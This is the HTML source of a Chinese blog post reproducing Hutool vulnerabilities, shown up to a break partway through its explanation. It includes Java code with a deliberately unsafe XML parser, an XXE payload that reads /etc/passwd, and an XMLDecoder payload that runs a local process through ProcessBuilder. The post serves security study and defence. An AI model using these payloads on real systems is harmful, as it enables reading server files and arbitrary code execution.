@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="hutoolXXE漏洞与XML反序列漏洞分析前言近年来，虽然Web应用程序中对XML技术的使用逐渐减少，但是XML相关的安全问题还是会成为攻击者的目标。XXE（XML外部实体注入）漏洞和XML反序列化漏洞是其中最常见的两类。Hutool是一个常用的Java工具库，提供了方便的XML处理工具，但如果使用不当，也可能导致严重的安全隐患。本文将深入分析Hutool中的XXE漏洞与XML反序列化漏洞的风险">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hutoolXXE漏洞与XML反序列漏洞分析">
+<meta property="og:url" content="https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="hutoolXXE漏洞与XML反序列漏洞分析前言近年来，虽然Web应用程序中对XML技术的使用逐渐减少，但是XML相关的安全问题还是会成为攻击者的目标。XXE（XML外部实体注入）漏洞和XML反序列化漏洞是其中最常见的两类。Hutool是一个常用的Java工具库，提供了方便的XML处理工具，但如果使用不当，也可能导致严重的安全隐患。本文将深入分析Hutool中的XXE漏洞与XML反序列化漏洞的风险">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/45ujgSnA4ClAgj-c5Y23uPyM6-zNtOJUsgOZQpWqGKI.png">
+<meta property="og:image" content="https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/lJdBSLOudbB3ta2pDEKg5cnNvZIppzVJHgBWeUmdmWQ.png">
+<meta property="og:image" content="https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/R7kSGoKv0ujKYtnPG9i-_W_xJT6hOSr9TRvzEhHmsFE.png">
+<meta property="og:image" content="https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/6Y0ajjH1qPfmXo_5et8Vf0LCcMExQXniNeebZ9XNNmc.png">
+<meta property="article:published_time" content="2024-09-25T03:25:49.000Z">
+<meta property="article:modified_time" content="2026-04-01T13:14:11.274Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/45ujgSnA4ClAgj-c5Y23uPyM6-zNtOJUsgOZQpWqGKI.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>hutoolXXE漏洞与XML反序列漏洞分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/04/16/JsRpc%E5%92%8Cyakit%E7%83%AD%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%90%8D%E7%A0%B4%E8%A7%A3/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&text=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&is_video=false&description=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hutoolXXE漏洞与XML反序列漏洞分析&body=Check out this article: https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&title=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&name=hutoolXXE漏洞与XML反序列漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2024/09/25/hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/&t=hutoolXXE漏洞与XML反序列漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hutoolXXE%E6%BC%8F%E6%B4%9E%E4%B8%8EXML%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">hutoolXXE漏洞与XML反序列漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hutool-%E4%B8%AD%E7%9A%84-XXE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">Hutool 中的 XXE 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XmlUtil-parseXml%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">XmlUtil.parseXml方法分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84DocumentBuilder"><span class="toc-number">1.2.2.</span> <span class="toc-text">不安全的DocumentBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%AF%B4%E6%98%8E"><span class="toc-number">1.2.3.</span> <span class="toc-text">代码说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">成功复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">XML反序列化漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XmlUtil-readObjectFromXml-%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">XmlUtil.readObjectFromXml 的反序列化过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.5.</span> <span class="toc-text">防御XML反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">1.5.</span> <span class="toc-text">参考文献</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        hutoolXXE漏洞与XML反序列漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-25T03:25:49.000Z" class="dt-published" itemprop="datePublished">2024-09-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="hutoolXXE漏洞与XML反序列漏洞分析"><a href="#hutoolXXE漏洞与XML反序列漏洞分析" class="headerlink" title="hutoolXXE漏洞与XML反序列漏洞分析"></a>hutoolXXE漏洞与XML反序列漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近年来，虽然Web应用程序中对XML技术的使用逐渐减少，但是XML相关的安全问题还是会成为攻击者的目标。XXE（XML外部实体注入）漏洞和XML反序列化漏洞是其中最常见的两类。Hutool是一个常用的Java工具库，提供了方便的XML处理工具，但如果使用不当，也可能导致严重的安全隐患。本文将深入分析Hutool中的XXE漏洞与XML反序列化漏洞的风险和防护措施。</p>
+<p><strong>免责声明：</strong>文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</p>
+<h2 id="Hutool-中的-XXE-漏洞分析"><a href="#Hutool-中的-XXE-漏洞分析" class="headerlink" title="Hutool 中的 XXE 漏洞分析"></a><strong>Hutool 中的 XXE 漏洞分析</strong></h2><h3 id="XmlUtil-parseXml方法分析"><a href="#XmlUtil-parseXml方法分析" class="headerlink" title="XmlUtil.parseXml方法分析"></a>XmlUtil.parseXml方法分析</h3><p>起初我使用hutool的一个方法：XmlUtil.parseXml，尝试实现xxe漏洞。进行测试之后发现，在 Hutool 中，XmlUtil.parseXml 默认情况下禁用了 DOCTYPE 声明，因此无法解析包含外部实体的 XML；所以以失败告终。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hutoolvul;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.XmlUtil;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xxe3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 构造恶意的 XXE payload，试图读取服务器上的 /etc/passwd 文件</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xxePayload</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;!DOCTYPE root [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;!ELEMENT root ANY &gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;!ENTITY xxe SYSTEM \&quot;file:///etc/passwd\&quot; &gt;]&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;root&gt;&amp;xxe;&lt;/root&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 Hutool 解析 XML</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用 XmlUtil.parseXml 方法，它将尝试解析并替换外部实体</span></span><br><span class="line">            <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> XmlUtil.parseXml(xxePayload);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出 root 节点的内容，恶意实体会被替换成服务器上的文件内容</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> document.getDocumentElement().getTextContent();</span><br><span class="line">            System.out.println(<span class="string">&quot;Node content: &quot;</span> + content);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="45ujgSnA4ClAgj-c5Y23uPyM6-zNtOJUsgOZQpWqGKI.png" alt="image"></p>
+<h3 id="不安全的DocumentBuilder"><a href="#不安全的DocumentBuilder" class="headerlink" title="不安全的DocumentBuilder"></a>不安全的DocumentBuilder</h3><p>但是在某些情况下，如果 disallow-doctype-decl 配置为 false，则Hutool的XML解析器可能会解析带有外部实体的XML，导致XXE漏洞。于是我通过创建一个不安全的 DocumentBuilder 来实现，这样我们可以在 XML 解析中允许 DOCTYPE 声明和外部实体。以下代码演示了一个存在漏洞的例子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hutoolvul;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xxeUnSafe</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 恶意的 XXE payload，试图读取服务器上的 /etc/passwd 文件</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xxePayload</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;!DOCTYPE root [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;!ELEMENT root ANY &gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;!ENTITY xxe SYSTEM \&quot;file:///etc/passwd\&quot; &gt;]&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;root&gt;&amp;xxe;&lt;/root&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用自定义的 DocumentBuilderFactory 允许解析 DOCTYPE 和外部实体</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">factory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            <span class="comment">// 禁用安全特性，允许解析 DOCTYPE</span></span><br><span class="line">            factory.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 DocumentBuilder</span></span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> factory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用自定义的 DocumentBuilder 解析 XML</span></span><br><span class="line">            <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> builder.parse(<span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayInputStream(xxePayload.getBytes()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出 root 节点的内容，恶意实体会被替换成服务器上的文件内容</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> document.getDocumentElement().getTextContent();</span><br><span class="line">            System.out.println(<span class="string">&quot;Node content: &quot;</span> + content);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a><strong>代码说明</strong></h3><ul>
+<li><strong>恶意 XXE 载荷 (xxePayload)：</strong>定义了一个 XML 文档，包含 DOCTYPE 声明，声明了一个外部实体 xxe，其值为 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd。</li>
+<li><strong>自定义 DocumentBuilderFactory：</strong>创建一个 DocumentBuilderFactory 实例，并禁用安全特性，允许解析 DOCTYPE 和外部实体。</li>
+<li><strong>解析 XML：</strong>使用自定义的 DocumentBuilder 解析恶意 XML 载荷。</li>
+<li><strong>输出内容：</strong> 打印解析后的 root 节点内容，包含 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 文件的内容。</li>
+</ul>
+<h3 id="成功复现"><a href="#成功复现" class="headerlink" title="成功复现"></a>成功复现</h3><p>执行之后，最终成功读取了&#x2F;etc&#x2F;passwd 文件</p>
+<p><img src="lJdBSLOudbB3ta2pDEKg5cnNvZIppzVJHgBWeUmdmWQ.png" alt="image"></p>
+<h2 id="XML反序列化漏洞分析"><a href="#XML反序列化漏洞分析" class="headerlink" title="XML反序列化漏洞分析"></a><strong>XML反序列化漏洞分析</strong></h2><h3 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a><strong>漏洞背景</strong></h3><p>Hutool 中的XmlUtil.readObjectFromXml方法直接封装调用XMLDecoder.readObject解析<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=xml&spm=1001.2101.3001.7020">xml</a>数据，当使用 readObjectFromXml 去处理恶意的 XML 字符串时会造成任意代码执行。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hutool <span class="number">5.8</span><span class="number">.11</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>与Java序列化漏洞类似，XML反序列化漏洞利用了反序列化过程中对输入数据的信任。如果开发者在反序列化XML数据时未对输入数据进行验证或限制，攻击者可以构造恶意的XML来执行任意代码或操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hutoolvul;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.XmlUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">rce</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        XmlUtil.readObjectFromXml(<span class="string">&quot;&lt;java&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;object class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;array class=\&quot;java.lang.String\&quot; length=\&quot;2\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;void index=\&quot;0\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;string&gt;open&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/void&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;void index=\&quot;1\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;string&gt;/System/Applications/Calculator.app&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/void&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/array&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;void method=\&quot;start\&quot;&gt;&lt;/void&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/object&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/java&gt;\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="R7kSGoKv0ujKYtnPG9i-_W_xJT6hOSr9TRvzEhHmsFE.png" alt="image"></p>
+<p>在我们的XML中</p>
+<ul>
+<li><java>根元素，表示该 XML 文档使用 XMLDecoder 来反序列化。</java></li>
+<li><object class="java.lang.ProcessBuilder">表示创建一个 java.lang.ProcessBuilder 对象。</object></li>
